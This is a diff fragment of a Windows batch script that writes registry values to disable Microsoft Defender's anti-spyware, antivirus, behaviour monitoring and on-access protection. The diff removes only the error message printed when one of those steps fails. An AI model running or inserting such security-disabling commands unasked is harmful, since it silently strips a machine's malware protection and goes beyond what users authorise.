@@ -21,7 +21,6 @@ set SignaturePath=%DefenderPath%\Signature Update
 set SpynetPath=%DefenderPath%\Spynet
 
 reg add "%DefenderPath%" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-if errorlevel 1 echo Failed to disable AntiSpyware
 reg add "%DefenderPath%" /v DisableAntiVirus /t REG_DWORD /d 1 /f
 reg add "%RealTimePath%" /v DisableBehaviourMonitoring /t REG_DWORD /d 1 /f
 reg add "%RealTimePath%" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
